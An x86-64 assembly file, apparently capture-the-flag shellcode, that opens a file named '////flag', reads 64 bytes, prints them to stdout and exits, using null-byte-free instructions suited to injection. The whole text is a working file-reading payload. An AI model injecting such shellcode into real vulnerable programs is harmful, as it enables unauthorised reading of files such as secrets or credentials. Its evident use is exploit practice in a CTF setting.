section .text
global _start

_start:
	xor     rax, rax
	push 	rax
	mov 	rbx, 0x67616c662f2f2f2f
	push 	rbx
	mov  	rdi, rsp

	mov     al, 2
	xor 	rsi, rsi
	xor 	rdx, rdx
	syscall

	mov     rdi, rax
	mov     rsi, rsp
	mov     dl, 0x40
	xor     eax, eax
	syscall

	xor     edi, edi
	inc     edi
	xor     eax, eax
	inc     eax
	syscall

	xor     eax, eax
	mov     al, 60
	xor     edi, edi
	syscall
